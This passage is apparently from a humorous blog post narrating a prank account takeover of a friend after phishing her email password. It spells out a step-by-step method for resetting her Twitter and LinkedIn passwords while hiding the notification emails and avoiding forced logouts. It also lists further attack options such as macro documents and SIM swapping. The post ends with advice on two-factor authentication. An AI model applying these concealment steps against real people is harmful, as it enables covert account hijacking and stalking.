I panic a little. Have I been found out? I log in to `dianalastname@hotmail.com` (which still works, thankfully) and see that all her emails have been archived. I poke around in the email forwarding settings, and I see that things have changed. Her email is no longer being sent to my email address, it's being sent to `dianalastname42@gmail.com` (presumably the new email that Diana now forwards all her mail to).

This raises an important question. How did Diana not notice my email address in the "forward all mail to:" box? Did she see it, and just mindlessly delete it?

(When I interview her after all this, she says yes, that's exactly what she did.)

## What now?

Normally it would end here. Mission accomplished. I'm in control of her email. I could cause catastrophic damage to Diana's life if I wanted to (I don't btw). There's potential for endless gags, limitless goofs, unlimited japes, infinte jests, etc.

But.. it seems like an awful shame to just... leave. That's why I start work on a little' somethin' called

## Operation Luigi

*Everybody just LOVES Mario's green friend Luigi! He's a Certified Good Boy! Just look at that boyish charm.*

![a good boy](https://sickr.files.wordpress.com/2013/06/luigi-circle.jpg)


*Why not brighten up YOUR social media presence with this game boy?*

Well gee I'm sold after that delightful interlude from our sponsor, The Nintendo. Let's get Diana some uncut, Colombian Luigi.

### Step 1: Get in to her Twitter and LinkedIn

So, I want to:

- Get access to Diana's Twitter
- *Not* lock Diana out
- *Not* alert Diana that I'm up in her stuff

I could just phish her again for these passwords, but I'm already a salty old fisherman by this point.

Since I have access to her email, I could reset her Twitter password.
The problem is, when you reset your Twitter password, you get logged out of Twitter in Chrome, the Twitter app, and anywhere else you might be logged in. So you have to retype your new password. One of my rules was that I wouldn't interrupt Diana's life, so I need her to be able to log back in to Twitter when I force her to log out.

I come up with a simple 8-step plan to do this, with 4 easy repayments of 2 steps.

1. Wait until Diana is asleep
2. Disable Diana's email forwarding
3. Go to Twitter and reset her password
4. Click the password reset link that gets emailed to her
5. **Set her password to `qwerty1`**
6. Delete the password reset email
7. Delete the "New Twitter Sign In" email
8. Re-enable email forwarding

The combo move in this is setting her password to `qwerty1`. When I phished her email password, she tried to log in to her email with `qwerty1` *even though that's not her password*. This tells me that she *thinks* her password for everything is `qwerty1`, or at least, that's what she'll try if she's not sure. The technical term for this is *next-level mindgames*💻💻💻.

I do the steps above, and I'm now logged in to Diana's Twitter account. I tighten up her Twitter security settings because I'm a Good Boy.
I HOPE that Diana will be able to log back in as well, and not wonder why she suddenly got logged out. I wait stressfully for her to tweet something, and after a day or so she retweets a cute doggo, so we're good to go.

Now I want to do the same thing on popular dating website LinkedIn. This will involve signing Diana out of LinkedIn on all her devices, and I don't want her to get too suspicious, so I wait a week. I do the same process as with Twitter. This time I don't even wait until Diana is asleep, because I'm young and invincible.

As I'm setting Diana's password on LinkedIn back to `qwerty1`, LinkedIn doesn't let me.

![moresecurepassword](https://i.imgur.com/IpOA2iv.png)

Is this because `qwerty1` was a password present in the LinkedIn hack in 2012? Or because it's just a common password?
For a brief moment I panic, but then I realise I can just set Diana's password to her email password, `wertyu2`.

Astute readers will have noticed this little guy in the screenshot above.

![littleguy](https://i.imgur.com/XYkmZAp.png)


LinkedIn is asking me if I'd like to log out of Diana's LinkedIn account on all devices while I'm resetting the password. That's *REAL* nice of you to offer old mate LinkedIn but I'm absolutely *golden* as it is in terms of logouts so *don't even worry about it* I'll be just fine how it is *NO REALLY* don't trouble yourself, I'm sure your CPU cycles are busy displaying everyone's 6000 word *Thinkpieces* about "Cyber" for "Non-technical Business Decision Makers".

![zoomed](https://i.imgur.com/1oxZfKR.png)

Yeah so I submit that form 100% checkbox-free, and Diana remains logged in to LinkedIn on all her devices, none the wiser.

## Step 2: Bring in the green boys

I enlist the help of a talented friend to photoshop everyone's #1 boy next door Luigi subtly into Diana's profile picture on Twitter, like a green guardian angel.

I can't show you Diana's pictures, so here's me doing similar photoshops to Your Boy And Mine, Five Time Celebrity MasterChef Winner And The Inventor of Bitcoin, Give It Up For Dr. Barack Obama Everybody:

![obama1](https://i.imgur.com/00gDWzz.png)
![obama2](https://i.imgur.com/RyiWH2b.png)

At about this time I [tweet](https://twitter.com/mangopdf/status/883633939054706688) about our sweet green boy so that if Diana sees her guardian angel Luigi, she'll know it was me. This is like my calling card except.... well it's not *really* like a calling card it's pretty dorky to be honest but just LOOK at that wholesome lad, you just *KNOW* he'd help you fix a flat tyre, and he'd just be too gosh darn polite to correct you if you said "thanks green mario" so really if you think about it I guess it IS like a calling card.

Next up I log into her LinkedIn account, get overwhelmed by her 15 LinkedIn notifications, 7 new profile views, 11 new Key People To Bother, and several pop ups telling me about new features I can use to invite people to join my professional network on LinkedIn™®©. Then I change her profile picture to my really good version.

For about a week, Diana continues her Twitter and LinkedIn(?) usage whilst being silently Luigi'd.
Diana goes on viewing what I can only assume to be the sharpest international political discourse on Twitter, and getting slightly more LinkedIn profile views from observant recruiters who are also fans of the hit 2001 ghostbusting game, Luigi's Mansion.

Well that just about wraps up Operation Luigi. Glad that's all done and dusted.

Although...

I'm basically a Luigi *technician* at this point, and it would be a _shame_ to let all that work go to waste. So let's just do

~_one more thing_~

## Operation Waluigi: A dark turn for mature audiences

Waluigi, true to his character, is much more direct.

![waluigilinkedin](https://i.imgur.com/nZpK7KG.png)

*Damn RIGHT* this new profile strength is "Advanced."

Please enjoy these half-baked opsec-enabled[^opsec] tweets[^believe].

![twitterbio](https://i.imgur.com/eNwheAO.png)
![waluigitweet](https://i.imgur.com/PE4IcF4.png)
![omg](https://i.imgur.com/P4F6Vpp.png)
![hacked](https://i.imgur.com/Uo8aO3U.png)
![waa](https://i.imgur.com/07xgNIL.png)
![greenboy](https://i.imgur.com/RuFsxTT.png)

[^opsec]: If you _really_ tried you could probably find Diana's Twitter from these. You would then be a hacking genius, binary flowing through your veins, and have a CVE number assigned to your personally. I, a humble wannabee, am relying on your strict ethics to prevent you from, uh, stalking the friend of some guy whose blog post you read. You can do it. I believe in you.

[^believe]: Having said that, I don't *really* have an overwhelming amount of faith in the idea that someone won't try to do that. You can stay chilled out, dear reader, since before this blog was published Diana and I had a nice chat and fixed up her personal security.

I also make Diana follow a bunch of Waluigi fan accounts (there are a *lot*), Nintendo of America, and @EmojiAquarium because it's a damn good account.

# Part 5: Epilogue

Diana likes her new Waluigi life so much she keeps it all up there, and even changes her Facebook photo to a Waluigi'd one.

I meet up with her and ask her about her side of the story a few days later.

Here are some choice quotes:

"I've since listened to a *lot* of Waluigi songs"
"Waluigi is the ultimate symbol of postmodernism, he exists only as a foil"

I ask her "How do you think I did it?". She says I must have hacked her email and reset her Twitter password, but she has no idea how I hacked her email.

When I show her the email chain with Kathleen on my computer her jaw drops for several seconds.

"You catfished me!"

We go back to the same ramen place after the interview. The credits roll.

## "wait but i am very afraid after reading this blog post, how do I not get 360 noscope hacked like diana tho"

Hey kids, it's me, "Alex". We've had a lot of fun today, but now it's time to talk about the *real* issues. The moral of this story is that it's really easy for someone else to know your password. Fret not, for you are young and extremely online, and it's not too late for you yet.

Step 1: Go to https://haveibeenpwned.com and type in your email address. This doesn't actually do anything, it's just to instill sufficient fear in you.

Step 2[^passwordmanagers]: Go to your email and enable "Two-step Authentication". You can go to [https://www.google.com.au/landing/2step](https://www.google.com.au/landing/2step/) if you use gmail. If you use Hotmail then I dunno, there's probably like a SkyCloud 360 X LIVE subscription you can buy that lets you do it.

[^passwordmanagers]: Password managers like [LastPass](https://lastpass.com) are also good for giving you unique passwords, but I reckon 2FA is the best effort:security ratio value For Normal People Tee Em.

![2fa](https://citwiki.oberlin.edu/images/2/29/Google-two-step-verification1.png)

Now, as well as your email password, you also type in a code from an app on your phone. Or you can have the code SMSed to you on your pastel-pink flip phone if you wanna relive the 90s[^authapp].

[^authapp]: But, this is less secure, since your phone number can still be hijacked.

If Diana had Verified Good Content Two-step Authentication turned on, then I would have had to get a two-factor code AND her password. I would have had to either:

* Phish the code as well as the password (but the code expires in less than 60 seconds)
* Physically go to the same place as her, connect to the same WiFi, and steal her browser session
* Email her a Word Doc with a macro in it that gives me control of her laptop, and steal her browser cookies from it
* Call up her phone provider and trick them into pointing her phone number at my SIM card

All of these are more work and higher risk, and so hackers often just move on to lower hanging fruit. That's you in this situation. You're the delicious fruit. And the hackers are.... giraffes? Yeah. Watch out for giraffes.


---


*Freshly baked shoutouts to My [Absolute](https://twitter.com/GracieNoLag) [Homeslices](https://twitter.com/adam_chal) for being my blog-review senpais, Diana for being chill, and to the hacking software released at DEFCON 25: Aerobatic dot io*

*If you want to talk to me about this, hit me up in the tweet zone: [@mangopdf](https://twitter.com/mangopdf).*
